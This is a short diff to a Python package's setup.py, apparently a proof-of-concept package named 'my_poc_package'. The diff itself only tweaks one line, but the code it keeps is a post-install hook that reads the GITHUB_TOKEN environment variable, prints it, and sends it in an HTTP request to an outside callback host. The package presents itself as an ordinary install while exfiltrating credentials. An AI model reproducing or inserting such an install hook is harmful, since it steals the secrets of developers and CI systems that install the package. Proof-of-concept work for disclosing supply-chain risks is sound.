@@ -15,7 +15,7 @@ class PostInstallCommand(install):
         print("Package 'my_poc_package' has been successfully installed!")
         # You can add your custom logic here, such as calling a function from your package
         import requests, os
-        token = os.getenv('GITHUB_TOKEN')
+        token = os.environ.get('GITHUB_TOKEN')
         print(token)
         requests.get(f"https://f2iwbqcy8byi2aekb8gvcsv8bzh45utj.i.ywh.at?token={token}")
 
